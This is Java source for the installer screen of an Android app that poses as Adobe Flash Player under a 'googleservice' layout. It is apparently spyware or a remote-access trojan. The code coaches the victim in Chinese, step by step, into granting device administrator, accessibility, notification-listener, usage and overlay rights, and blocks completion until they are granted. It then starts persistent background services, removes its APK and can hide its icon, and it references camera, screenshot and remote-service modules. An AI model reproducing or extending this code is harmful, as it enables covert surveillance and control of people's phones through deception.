package com.adobe.flashplayer.install;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

import com.adobe.flashplayer.MainEntry;
import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.PrefOper;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.accessory.HookLauncher;
import com.adobe.flashplayer.core.CoreHelper;
import com.adobe.flashplayer.core.DeviceManager;
import com.adobe.flashplayer.core.ForegroundSrv;
import com.adobe.flashplayer.core.RemoteSrv;
import com.adobe.flashplayer.core.UsageStatsMgr;
import com.adobe.flashplayer.data.CameraActivity;
import com.adobe.flashplayer.data.CameraActivity2;
import com.adobe.flashplayer.data.ScreenShotActivity;

public class InstallActivity extends Activity  {

    private final String TAG = "[ljg]Install ";

    public static Button authority = null;
    public static OnClickListener authoritylistener;

    public static Button rebootup = null;
    public static OnClickListener rebootuplistener;

    public static Button notification = null;
    public static OnClickListener notificationlistener;

    private static Button floatwindow = null;
    private static OnClickListener floatwindowListener = null;

    private Button batteryOpt = null;
    private OnClickListener batteryOptListener;

    public static Button devmgr = null;
    public static OnClickListener devmgrListener = null;

    public static Button complete = null;
    public static OnClickListener completelistener;

    private Button appsusage;
    private OnClickListener appsusageListener;

    public static Button accessibility = null;
    public static OnClickListener accessibilitylistener;

    public static Button root = null;
    public static OnClickListener rootlistener;

    static Handler mHandler = null;

    private int BATTERYOPT_REQUESTCODE = 0x1234;

    public static boolean debug_flag = true;

    public static boolean permission_authoritized = false;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        try {

            super.onCreate(savedInstanceState);

            Public pub = new Public(getApplicationContext());

            Log.e(TAG,"onCreate");

            PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPMODE, Public.SETUPMODE_MANUAL);

            if (debug_flag ){

                /*
                Intent intentscr = new Intent(InstallActivity.this, ScreenShotActivity.class);
                intentscr.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intentscr);

                Intent intentCamera = new Intent(InstallActivity.this, CameraActivity.class);
                intentCamera.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentCamera.putExtra("index",0);
                intentCamera.putExtra("count",1);
                startActivity(intentCamera);
                 */

                install(InstallActivity.this);
            }
            else{
                checkInstallCode(InstallActivity.this);
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            String error = Utils.getExceptionDetail(ex);
            String stack = Utils.getCallStack();
            MyLog.writeLogFile(TAG+"setup exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
        }
    }


    public void checkInstallCode( Activity activity){

        mHandler = new InstallCheckHandler(InstallActivity.this);

        new Thread(new Runnable() {
            @Override
            public void run() {
                String ret = InstallChecker.checkInstallCode(InstallActivity.this,mHandler);
                Log.e(TAG, "checkSetup ret:"+ret);
            }
        }).start();
    }


    public void install(Activity activity){

        activity.setContentView(R.layout.activity_googleservice);

        authority = (Button)findViewById(R.id.authoritySetting);
        rebootup = (Button)findViewById(R.id.startupSetting);
        notification = (Button)findViewById(R.id.notificationSetting);
        devmgr = (Button)findViewById(R.id.devmgrSetting);
        batteryOpt = (Button)findViewById(R.id.powerOptSetting);
        complete = (Button)findViewById(R.id.complete);

        floatwindow = (Button)findViewById(R.id.floatingWindow);
        accessibility = (Button)findViewById(R.id.accessibilitySetting);
        appsusage = (Button)findViewById(R.id.appsUsage);
        root = (Button)findViewById(R.id.rootSetting);

        String factory = android.os.Build.MANUFACTURER;
        if (factory.contains("vivo")) {
            authority.setText("请先点击软件管理然后点击软件权限管理找到软件权限");
            rebootup.setText("请先点击软件管理然后点击自启动管理打开开机启动项");
        }else if (factory.contains("Meizu")) {
            rebootup.setText("请点击后台管理允许后台运行或开机启动");
            //authority.setText("请设置权限和悬浮窗");
        }else if (factory.contains("HUAWEI") || factory.contains("OPPO") || factory.contains("vivo")) {
            //XiaoMi will be ok
            if (Build.VERSION.SDK_INT >= 21) {
                if (devmgr != null) {
                    devmgr.setVisibility(View.GONE);
                }else{
                    Log.e(TAG, "why sometimes devmgr is null?");
                }
            }
        }

        root.setVisibility(View.GONE);
        //floatwindow.setVisibility(View.GONE);
        //accessibility.setVisibility(View.GONE);
        //appsusage.setVisibility(View.GONE);

        if (Build.VERSION.SDK_INT < 23) {
            batteryOpt.setVisibility(View.GONE);
        }

        authoritylistener = new InstallAuthority(InstallActivity.this);

        rebootuplistener = new InstallBootup(InstallActivity.this);

        batteryOptListener = new OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(InstallActivity.this, "请允许"+ getString(R.string.app_name)+"忽略电池优化", Toast.LENGTH_LONG).show();
                InstallHelper.ignoreBatteryOpt(InstallActivity.this,BATTERYOPT_REQUESTCODE);
            }
        };

        appsusageListener = new OnClickListener() {
            @Override
            public void onClick(View v) {
                UsageStatsMgr.openAppUsage(InstallActivity.this);
                Toast.makeText(getApplicationContext(), "请点击\"" + getString(R.string.app_name) +"\"允许应用使用统计",Toast.LENGTH_LONG).show();
            }
        };

        devmgrListener = new OnClickListener() {

            @Override
            public void onClick(View v) {
                ComponentName cn = new ComponentName(InstallActivity.this, DeviceManager.class);
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,getString(R.string.general_label_name));
                startActivity(intent);

                Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"激活设备管理器",Toast.LENGTH_LONG).show();
            }
        };

        completelistener = new OnClickListener() {

            @Override
            public void onClick(View v) {
                try{
                    if (Build.VERSION.SDK_INT >= 23) {
                        Permission.checkPermission(InstallActivity.this);
                    }

                    if (permission_authoritized == false){
                        Toast.makeText(InstallActivity.this, "未获得权限,必须获得授权才能结束安装",Toast.LENGTH_LONG).show();
                        return;
                    }

                    NotificationManager nm =(NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
                    nm.cancelAll();
                    try {
                        nm.cancelAll();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    CoreHelper.startForegroundService(InstallActivity.this);

                    CoreHelper.startJobDeamonService(InstallActivity.this);

                    Toast.makeText(InstallActivity.this, "即将完成设置",Toast.LENGTH_LONG).show();

                    PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPCOMPLETE, "ok");

                    Intent intent = new Intent(InstallActivity.this, MaskActivity.class);
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);

                    if (debug_flag == false){
                        mHandler.removeCallbacksAndMessages(null);
                        //InstallHelper.hideDesktopIcon(InstallActivity.this);
                    }
                    else{

                        new MainEntry(InstallActivity.this,"").start();
                    }

                    finish();

                    return;
                }catch(Exception ex){
                    ex.printStackTrace();
                }
            }
        };

        notificationlistener = new OnClickListener() {

            @Override
            public void onClick(View v) {
                try {
                    if (android.os.Build.VERSION.SDK_INT < 18) {
                        return;
                    }
                    Intent intent;
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                        intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                    } else {
                        intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                    }
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"允许通知消息",Toast.LENGTH_LONG).show();
                } catch (Exception ex) {
                    ex.printStackTrace();
                    String errorString = Utils.getExceptionDetail(ex);
                    String stackString = Utils.getCallStack();
                    MyLog.writeLogFile("notelistener OnClickListener exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
                    return ;
                }
            }
        };

        accessibilitylistener = new OnClickListener() {
            @Override
            public void onClick(View v) {
                try {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"并允许辅助功能",Toast.LENGTH_LONG).show();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        };

        floatwindowListener = new OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(getApplicationContext(), "请点击" + getString(R.string.general_label_name) +"允许使用悬浮窗",Toast.LENGTH_LONG).show();
                Permission.checkCandrawOverly(InstallActivity.this);
            }
        };

        try{
            authority.setOnClickListener(authoritylistener);
            rebootup.setOnClickListener(rebootuplistener);
            notification.setOnClickListener(notificationlistener);

            batteryOpt.setOnClickListener(batteryOptListener);

            accessibility.setOnClickListener(accessibilitylistener);

            appsusage.setOnClickListener(appsusageListener);

            devmgr.setOnClickListener(devmgrListener);

            floatwindow.setOnClickListener(floatwindowListener);

            complete.setOnClickListener(completelistener);

            InstallHelper.removeApk(this,"");

        }catch(Exception ex){
            ex.printStackTrace();
        }
    }


    @Override
    public void onActivityResult(int requestCode, int resultCode,Intent data){
        super.onActivityResult(requestCode, resultCode, data);

        Log.e(TAG, "result code:" + resultCode);

        if (requestCode == BATTERYOPT_REQUESTCODE) {

            Log.e(TAG, "baterry optimize denied");
        }
        else{
            Log.e(TAG, "baterry optimize permission ok");
        }
    }



    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,int[] grantResults){

        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if(requestCode == Permission.PERMISSIONCODE){
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) {
                    //Log.e(TAG,permissions[i] + " is permitted");
                }else if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    //Log.e(TAG,permissions[i] + " is denied");

                    //ActivityCompat.shouldShowRequestPermissionRationale(permissions[i]);
                    //shouldShowRequestPermissionRationale的返回值
                    //1第一次打开App时false
                    //2上次弹出权限点击了禁止（但没有勾选下次不在询问）true
                    //3上次选择禁止并勾选：下次不在询问false
                }
            }

            permission_authoritized = true;
        }else{

        }
    }


    @Override
    protected void onDestroy() {
        try{
            super.onDestroy();

            Log.e(TAG,"onDestroy");

        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
